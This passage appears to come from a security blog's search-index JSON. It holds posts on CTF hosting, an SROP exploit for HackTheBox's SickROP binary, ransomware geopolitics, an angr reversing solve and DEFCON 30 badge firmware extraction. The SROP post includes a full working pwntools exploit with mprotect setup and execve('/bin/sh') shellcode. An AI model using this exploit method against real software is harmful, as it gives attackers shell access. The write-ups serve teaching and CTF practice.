diagnose and restart it within 15 minutes. While the downtime was minimal, the ticket system exploded with caffeine-fueled complaints. In hindsight, we could’ve prevented this entirely by setting Docker memory caps or isolating high-load challenges onto separate servers. Postface Hopefully, this gives insight into what goes into hosting a CTF and the unexpected challenges that can arise. Hosting a CTF is fun, rewarding, and a great way to give back to the security community. There’s nothing like watching people solve challenges you built — sometimes even in ways you didn’t expect. If you’re considering organizing one: just do it. The experience is invaluable. Learn from our mistakes, plan for chaos, and you’ll have fewer things to worry about when the popcorn burns. See you all next year for PatriotCTF 2024." }, { "title": "Return to Sigreturn", "url": "/posts/How-to-srop/", "categories": "CTF", "tags": "CTF, srop", "date": "2023-09-11 00:00:00 -0400", "content": "How the sigreturn syscall can be used to provide water in a desert. Table of content Foreword What and why? Analysis Landing in sigreturn Return to mprotect Full exploit Forward People alot smarter than me have been inventing techniques for breaking binaries longer than I’ve been alive. And depending on the situation you find yourself in, there can be some very interesting ways to use a specific technique to achieve great effect and help with predicaments. It also goes to show that the struggle is not always about finding a vulnerability, but doing something actually useful with it. This post is going to go over SROP (ret2sigreturn) a technique that can be used to control registers in an environment where you may not have the appropiate gadgets or ability to do so. What and why Before going over the situations where ret2sigreturn would be useful and what it is, it might first be better to understand what the sigreturn syscall is. Sigreturn is a special syscall that assists the kernel with context switching when handling signals. This means both saving and restoring a process context. Because sigreturn is responsible for restoring context it also has code present that restores the context of each register. It does this via a sigreturn frame, sigreturn’s only parameter which holds the values of all registers which sigreturn has to restore. The following is the internals to see what’s happening specifically. Sigreturn will pop segment registers, general purpose registers, flags and finally ret will restore the program counter. These are all pop instructions since sigreturn expects the sigreturn frame struct to be on the stack at this point. The technique here is crafting our own sigreturn frame and making the syscall to sigreturn. This would give us control over every register. So in an environment which lacks the appropiate gadgets or in which we cannot control something we need to, returning to sigreturn could prove a godsend option. The use-case situation is not dissimilar to the ret2dllresolve technique, in which we return to dllresolve to trick the linker into resolving uninitialized functions into the plt, but usually one of the two will be the obvious path to take compared to the other, say if you have a statically linked binary and there is no resolving. In this situation, not only would ret2dllresolve not be possible, but it would also make srop easier as lots of glibc functions are just wrappers around syscalls and thus there are syscall gadgets. The main issue with ret2sigreturn, as made apparent by the source, is that it pops every register, including special purpose registers like cs and registers we don’t nessecarily want to control such as the stack pointer, which might be hard to set to somewhere appropiate without a leak. Because of this, we need to spend time crafting our forged sigreturn frame and consider everything including where we want to set the program counter and dealing with the forced stack pivot. Unlike ret2dllresolve, ret2sigreturn does require we have atleast prior control over the register used for making syscalls (rax on x86-64). To better illustrate the concept we’ll go over the SickROP challenge from HackTheBox. Analysis We are given a statically linked, non-stripped binary with DEP enabled. An initial review of the program reveals that it does not offer much in terms of functionality and only consists of one function (besides statically compiled functions and _start). The vuln function just reads from stdin and then echos it out to the screen with write. Observe in _start that this is looped forever. There is a very large buffer overflow, 0x300 is being passed as the size argument to read into var_28, which is only 32 bytes. This is likely to give us enough space for the sigreturn frame. Note that the buffer being passed to read (var_28) is on vuln’s stack frame. Unsuprisingly, this binary does not provide us many gadgets. We do not even have a gadget to control rax, our syscall register. We do however, have syscall gadgets from read and write. We need a way to control the rax gadget for our syscall number. Luckily for us rax is also used to store the return value on x86 and both read and write return the number of bytes they operated on as the return value. Thus we could send 15 bytes to read to have the right value for rax by the time of the overflow. Landing in Sigreturn We overwwrite the return address at an offset of 40 bytes, but it won’t matter if we return to a syscall without the right syscall number for sigreturn (15). My main workaround to get into sigreturn is to add vuln to the ROP chain, before the syscall gadget, that way I can set rax. So first we return to vuln and send 15 bytes, then we return to the syscall gadget. from pwn import * vuln = p64(0x000000000040102e) syscall = p64(0x0000000000401014) payload = b\"A\"*40 payload += vuln payload += syscall elf = ELF(\"./sick_rop\") p = elf.process() gdb.attach(p, \"b * 0x000000000040104e\") # ret p.sendline(payload) p.clean() p.sendline(b\"A\"*14) p.clean() p.interactive() Following this we can see that we end up at the syscall gadget after having called vuln again and sending it 15 bytes. So rax is set to the sigreturn syscall number. Following the syscall we see that we end up in sigreturn, note how all the registers were set to values from the stack at the time of the call, which were environment variables. Now that we have control over execution flow, we need to actually forge the sigreturn frame to send. Recall that this frame will need to include ALL registers in the respective order. Luckily pwntools provides magic that does this, so we do not have to tediously craft this frame ourselves. Return to mprotect Now that we can control all our needed registers, we can plan out an exploit. Ideally we could just return to execve, but the issue is there is no “/bin/sh” string present in the binary, you could easily read this string onto the new stack (which hopefully is somewhere without aslr) or make some other syscalls to get this string into memory, but I just opted to use the sigframe to setup for an mprotect syscall. By returning to mprotect, we can mark any section of the binary as executable, my plan was to use the sigreturn frame to move the stack somewhere useful in the text section and also make the whole text section executable. That way, after calling mprotect, I could return to vuln and simply get a shell using shellcode. As seen my the syscall entry, mprotect takes three arguments. The start address, size and protection flag for the section we’d like to make executable. I organize the sigreturn frame to make the entire binary section executable passing the arguments according to calling convention. Recall we’re using pwntools magic, so ever register we do not specify to pwntools will be defaulted to zero. We set the program counter to the syscall gadget location, which is followed by a ret, so we also need to pivot the stack somewhere that points to the address of the next return location. After randomly running tele on different parts of the text segment, I found an address with a pointer to vuln, which was perfect. After returning to vuln and running vmmap, we can see that the text space is now executable. This doesn’t completely solve the string problem though, luckily there is a piece of assembly code present in the statically compiled read/write function. We could simply place the string at the right place on the stack, which will get moved into rsi, which we can then in turn provide shellcode that moves rsi into rdi. We can then have the return address point to our shellcode since it is in an area without address randomization. Full exploit from pwn import * vuln = p64(0x000000000040102e) syscall = p64(0x0000000000401014) ''' /bin/sh -&gt; rsi nop sled mov al,0x3b mov rdi,rsi xor rsi,rsi xor rdx,rdx syscall ''' execve = b\"/bin/sh\"+b\"\\x00\"+b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"+b\"\\xB0\\x3B\\x48\\x89\\xF7\\x48\\x31\\xF6\\x48\\x31\\xD2\\x0F\\x05\"+b\"A\"*11 payload = b\"A\"*40 payload += vuln payload += syscall frame = SigreturnFrame(arch=\"amd64\", kernel=\"amd64\") frame.rax = 10 # mprotect frame.rdi = 0x0000000000400000 # addr frame.rsi = 0x2000+1000 # len frame.rdx = 7 # prot frame.rip = u64(syscall) frame.rsp = 0x00000000004010d8 payload += bytes(frame) elf = ELF(\"./sick_rop\") p = elf.process() #gdb.attach(p, \"b * 0x000000000040104e\") p.sendline(payload) p.recvline() p.sendline(b\"A\"*14) p.recvline() p.recvline() p.sendline(execve+p64(0x4010c3)) p.interactive()" }, { "title": "International Implications of Ransomware for Dummies", "url": "/posts/ransomware-and-geopolitics-for-dummies/", "categories": "Non-technical", "tags": "non-technical", "date": "2023-04-25 00:00:00 -0400", "content": "Modern ransomware attacks often greatly affect civilian life and government operations — it is a geopolitical issue. Fuel holding tanks are seen at Colonial Pipeline’s Linden Junction Tank Farm on May 10 in Woodbridge, N.J. | Michael M. Santiago/Getty Images The Rise of Digital Chaos In 2017, a powerful cyber weapon disrupted “Constitution Day”, a holiday in Ukraine which celebrates the country’s adoption of an independent constitution. Under the noise of fireworks, a silent worm spread across computer systems disabling radiation safety systems at the Chernobyl site, shutting down banks and ATMs, disrupting businesses, maiming the Ukrainian electrical power grid and metro networks. Operators watched helplessly as a skull illuminated their screens, notifying them that their hard drives had been encrypted and demanding a ransom. The scenario seemed familiar — and it was. The attack mimicked a known ransomware strain, Petya. But this was NotPetya. Unlike typical ransomware, NotPetya was not financially motivated. Its encryption algorithm had been altered to make decryption impossible. Later forensic research strongly suggested that it was developed and deployed by Russian intelligence services. Despite the wealth of digital evidence, Russia faced little tangible consequence due to the difficulty of attribution in cyberspace. Criminal Enterprises and Safe Havens Criminal ransomware operators have exploited this ambiguity. Many operate safely within Russia’s borders under an unspoken “safe-harbor” understanding — they may attack globally, but never domestically. Although Western law enforcement has indicted numerous Russian cybercriminals, few ever see trial. Ransomware has become one of the most lucrative criminal enterprises in modern history. Its targets — critical infrastructure, corporations, and healthcare systems — have ripple effects that touch millions of civilians. As nations digitize their essential operations, ransomware has transitioned from a criminal nuisance to a geopolitical weapon. The International Policy Problem Governments struggle to respond effectively. Ransomware crosses borders and jurisdictions, leaving victims without clear avenues for recourse. Most states resort to issuing indictments or sanctions, symbolic gestures that rarely result in arrests. This underscores the need for international policy coordination — frameworks for attribution, response, and deterrence. Civilian and Economic Impacts Ransomware at this scale has two broad categories of impact: Economic Disruption (Type I): Attacks on private industries that cascade through the supply chain — e.g., the Cognizant incident. Critical Infrastructure Disruption (Type II): Attacks that directly affect civilian safety or essential services — e.g., the Colonial Pipeline incident. Large-scale attacks can shake economies and endanger lives. According to Sophos, 42% of organizations with over 1,000 employees experienced ransomware incidents. Cybercrime Magazine projects global ransomware damages will reach $265 billion annually by 2031, with a new attack every two seconds. National Security and the Cyber Front Attacks like WannaCry’s impact on the NHS highlight that ransomware is not just an IT problem — it is a homeland security issue. The FBI has warned that such attacks “can impact the physical safety of American citizens.” In response, the U.S. established the Cybersecurity and Infrastructure Security Agency (CISA) in 2018. CISA now coordinates national response efforts and operates StopRansomware.gov, underscoring how ransomware has become a threat to national and international stability. Ransomware and Geopolitics The U.S. Treasury notes that ransomware payments can “undermine U.S. foreign policy and national security interests.” BBC analysis found that 74% of ransomware profits in 2021 went to Russia-linked actors. Some groups, such as Conti and Trickbot, have expressed explicit support for Russia’s invasion of Ukraine — blurring the line between cybercrime and state action. Reports from Bellingcat and the U.S. Treasury suggest that these groups may have direct ties to Russian intelligence, particularly the FSB. Whether or not these connections are formalized, the effect is clear: ransomware has become an instrument of state power cloaked in criminal anonymity. Law, Attribution, and Due Diligence International law still lags behind cyber realities. Article 2(4) of the U.N. Charter prohibits the use of force against another state, but cyber operations rarely meet its threshold. Similarly, the principle of due diligence — a state’s obligation not to allow its territory to be used for harm — is regularly flouted by Russia’s permissive stance toward cybercriminals. Without stronger international consensus, ransomware will continue to exploit the gaps in digital governance and international law. Conclusion Ransomware has evolved from an online extortion scheme into a geopolitical force capable of influencing economies, national security, and international relations. Combating it requires more than firewalls and patches — it demands international cooperation, diplomatic pressure, and legal modernization. Only when the world begins defining the rules of cyberspace and coordinating cross-border policy will we begin to curb the global ransomware epidemic." }, { "title": "Feed the Magical Goat (Battelle)", "url": "/posts/battelle-magical-goat/", "categories": "CTF", "tags": "angr, reversing, CTF, file-sim", "date": "2023-03-23 00:00:00 -0400", "content": "Reversing challenge from Battelle showcasing angr’s file simulation feature! Table of contents Reversing Angr Solve Part 1: Reversing The following is a writeup for a reverse engineering challenge made by Battelle as one of their cyber career challenges. This challenge explores the use of angr and its ability to emulate file systems for the use of symbolic data. If you are unfamiliar with Angr and the concept of symbolic execution, I made a YouTube video exploring and explaining this which I (obviously) highly recommend you watch. A zip file containing a 32-bit, unstripped ELF is provided as part of the challenge. Running the binary outputs a bunch of text and then ends with the binary deleting itself. Starting a Binja project and looking through the strings reveals the following: File operations A filename A flag format string (Character by character, flag is likely calculated within the binary) Viewing main, a function is called which interacts with what is likely the expected file called give_offering. The function first opens chow.down and assigns the stream to eax. The following conditional checks if the operation was not successful via checking the file descriptor in eax. If it wasn’t, the program closes the file descriptor, unlinks the binary (deletes it), prints the outro and calls exit. From here on I will refer to this blob as the fail block. Assuming this conditional was false, the file is allocated onto the heap at eax_2. The next conditional checks if eax_2 is 0x40; if true a hint is printed, both the elf and chow.down are deleted and the chunk is freed, followed by a fail block. The next conditional returns the pointer to the file contents and is the path I have to follow in order to continue program execution. It checks if more than 0xf bytes were read. Returning to main, multiple conditions are checked against various offsets of the file content. If code execution continues without a conditional being true, the flag is printed using these file content offsets, of which I assume were operated on by the functions in the conditions. Looking at just one of the functions reveals that it is quite complicated. Manually reversing these functions would be significantly detrimental to my mental health, so instead I’ll use symbolic execution to find an execution path that leads to the flag print and what the file contents need to be in order for this path to execute. Angr is a symbolic execution engine for Python that utilizes Microsoft’s SMT solver Z3 and a simulation manager to manage execution states. It is also capable of file system emulation. Using this feature will be simpler than alternative methods of symbol placement, such as directly injecting into memory. Part 2: I’m Angry FS The following is my solve script: import angr,claripy,sys p = angr.Project(\"./billygoat\") s = p.factory.blank_state(addr=0x8048f46) symbol = claripy.BVS('file',8*0xf) f = angr.storage.SimFile(\"chow.down\", content=symbol) s.fs.insert(\"chow.down\",f) def win(state): # Check stdout for \"flag{\" and print flag out = str(state.posix.dumps(sys.stdout.fileno())) if \"flag{\" in out: print(\"Flag: flag\"+out.split(\"flag\")[1][:-3]) return \"flag{\" in out simgr = p.factory.simulation_manager(s) simgr.explore(find=win, avoid=0x80490ce) print(b\"Input: \"+simgr.found[0].posix.closed_fds[0][1].concretize()) Let’s step through it to understand it better. The first few lines create the Angr project, create the initial state which starts in give_offering (0x8048f46) and creates a symbol whose size is based on the constraint within that function. p = angr.Project(\"./billygoat\") s = p.factory.blank_state(addr=0x8048f46) symbol = claripy.BVS('file',8*0xf) Next a SimFile object is created with the name chow.down and whose content is the symbolic data. It is then inserted into the simulated file system. f = angr.storage.SimFile(\"chow.down\", content=symbol) s.fs.insert(\"chow.down\",f) Moving on, a function to check for a valid state is created. It checks for the substring flag{ in the stdout and prints it. Then the simulation manager is created and explored with find set to this function and avoid set to the fail block. def win(state): # Check stdout for \"flag{\" and print flag out = str(state.posix.dumps(sys.stdout.fileno())) if \"flag{\" in out: print(\"Flag: flag\"+out.split(\"flag\")[1][:-3]) return \"flag{\" in out simgr = p.factory.simulation_manager(s) simgr.explore(find=win, avoid=0x80490ce) The last line is interesting and I initially had to get help with this as Angr has some issues with managing file descriptors. Essentially its purpose is to print out the symbolic content of the file that led to the success block. print(b\"Input: \"+simgr.found[0].posix.closed_fds[0][1].concretize()) Looking at the source of Angr’s posix plugin can help clarify this line a bit better. A deep copy of the SimState is created and the closed_fds copy is a list of the super object’s closed_fds, which is also a list. This line accesses the right file descriptor and patches the input together using concretize. With that, the challenge is solved." }, { "title": "Cracking the DEFCON 30 Badge Firmware", "url": "/posts/Cracking-the-Defcon-30-Badge-Firmware/", "categories": "CTF, Embedded", "tags": "firmware rev, chip extraction, badge", "date": "2022-11-22 00:00:00 -0500", "content": "Extracting and reversing the firmware of the DC30 badge to beat the badge challenge! Table of contents Backstory Firmware Extraction Analysis and Finding Check Mapping and Decoding Backstory and Objective Once upon a time I was very excited to fly to Las Vegas and attend DEFCON 30 the annual go-to security conference. This was going to be my first conference and I had purchased pre-registration tickets, which was a new system that DEFCON was using to allow attendees to guarantee a badge and semi-skip LINECON. However, because of a personal emergency that appeared last minute, I was unable to attend and I gifted my pre-registration to my good friend and mentor playoff-rondo. Later on when I was catching up with him he gave me his badge. DEFCON badges usually have some sort of challenge on them and this year’s badge was some sort of piano keyboard. This is the writeup made by the attendee that solved the badge challenge and won a black badge, as you can see it is meant to be solved in part by interacting with other attendees who have a different variant of the badge. This is obviously not possible for me, so my goal was to reverse engineer the badge and find what key combo needs to be pressed in order to win the first part of the challenge. Part 1: Extracting Firmware from SPI Flash I began by using a magnifying glass, pen and paper to identify all the visible chips on the PCB. The two important chips to note are the Winbond W25Q16JV (flash chip) and the RP2 B2 (microcontroller). The flash memory chip will be used to grab the firmware and will be the target chip to physically extract. The microcontroller will be used to determine the architecture, conventions and other information that will be useful when analyzing the firmware. There are tools available to extract firmware from a surface-mounted chip without having to actually remove the component, however I will be using a TL866II+ universal programmer, so I will have to remove the chip from the PCB, feed the chip to the device using the appropriate adapter and connect the programmer to my VM for extraction. A heat gun would be ideal for removing a small surface mounted chip like this without damaging the PCB, however I do not have access to such equipment, so I use a soldering iron and tweezers. I heat up each joint of the chip with the iron and lift the leg up with tweezers and a magnifying glass. After I have detached the chip from the board, I go around with the iron again and a desoldering pump in an attempt to clean up as much excess solder as possible from each leg. Then I lock the flash chip in the corresponding adapter and insert it into the TL866II+. Unfortunately, the whole ordeal was pretty messy and resulted in a bit of copper from the PCB being destroyed (as is natural for my first chip-off extraction). In my ubuntu machine I use the minipro program to interact with the chip programmer. The following command writes the firmware to a file. minipro -p \"W25Q16JV@SOIC8\" -r flash.bin I can verify that this is the firmware by running strings and examining the output. Part 2: Analyzing Firmware and Finding the Comparison Function The MCU is a rpi2040 which makes use of the “execute in place” feature. This is a feature that improves performance by enabling execution directly in flash storage rather than execution in the MCU’s limited memory area. It is important that we keep this in mind before starting to analyze the firmware. Firmware has no entry point and instead has a defined address at which program execution begins. We can find this base address by viewing the rpi2040 datasheet and navigating to the “Address Map” page from the table of contents. The base address will be the XIP address (execute in place). We need to specify this address as the base address in whatever we use to analyze the firmware to load the correct segment. Using Binaryninja I can specify the base address when creating a new project. Binja automatically detects the thumb2 ARM architecture. I start to try and identify useful symbols and organize the code by searching through strings and going to their code references. Some areas have been incorrectly loaded as symbols so I undefine them. I also rename symbols that have obvious functions for clarity. Identifying and following the code reference of the interesting string, “YOU DID IT!” leads to what seems to be the function that is called when a correct key combination is entered. The only code reference leads to the following function. The first thing I noted when initially examining it was the comparison inside the loop to 0x2d. This conditional is equal to if(r3_1 == 0x2d(which is 46)) since the if-statement ends in a break. Examining the note count on my own badge and noting the number of badges with different variations, we know the total number of piano keys that make-up the passing combo is 46, since all badge’s music sheets will be used. The decompilation process complicated this loop a bit, so for sanity’s sake lets simplify it a bit in our heads. The while loop iterates over the length of the correct combo, once it reaches 46 (the length of the combo) it succeeds. The second if-statement is most important, it compares every key (it gets the key by referencing the location of the key presses in memory with the offset of the current index) with the given character at string[index] if it is not equal, it breaks ending the while loop early and never reaching the success block, else it increments combo_length. So the string in the second conditional is what we need to pay attention too. C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@C@CE@EC@&gt;&lt;C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@&gt;@C@CE@EGDB@ Since each key press is being compared with this string, it is safe to assume that each character in this string is mapped to a physical key on the badge. We should find another function which identifies this mapping. This would likely be the keypress code blobs directly. Some things to note before continuing: User key buffer stored @ 0x2000xxxx (keypresses). The checkwin function will likely be called every time a key is pressed, to check if the newly modified buffer is a win. Part 3: Finding the Mapping and Decoding the Key Combo checkwin has a lot of code references. Each call is likely in a blob for a key press. I’ll pin the references window and tag them all to keep everything organized and visible on the pane. Examining the very first reference we can take note that a pointer is being passed as the argument. The value at this pointer is being assigned above. For this instance that value is 0x3c, whose ascii representation is “&lt;”. Each blob that assigns a mapping is sequential in the code block, so I can safely assume that these are the keyboard mappings assigned in the order as they appear on the physical keyboard. Proceeding to the next checkwin call will reveal the mapping for the C# key (the little black key) which comes next. Proceeding through every checkwin call will reveal the character mappings for the entire keyboard. Hurray! With these mappings we can decipher the string compared in the checkwin function to the equivalent keys on the keyboard. key_map = {\"&lt;\":\"C\",\"=\":\"C#\",\"&gt;\":\"D\",\"?\":\"D#\",\"@\":\"E\",\"A\":\"F\", \"B\":\"F#\",\"C\":\"G\",\"D\":\"G#\",\"E\":\"A\",\"F\":\"A#\",\"G\":\"B\"} key_combo = \"\" for c in \"C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@C@CE@EC@&gt;&lt;C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@&gt;@C@CE@EGDB@\": key_combo += key_map.get(c)+\" \" print(key_combo) The following is the correct key-combination/tune we need to play on the badge keyboard in order to pass the first challenge. G E D C D E G E D C D E G E G A E A G E D C G E D C D E G E D C D E D E G E G A E A B G# F# E Sources https://www.winbond.com/hq/support/documentation/levelOne.jsp?__locale=en&amp;DocNo=DA00-W25Q16JV.1 https://datasheets.raspberrypi.com/rp2040/rp2040-datasheet.pdf" } ]
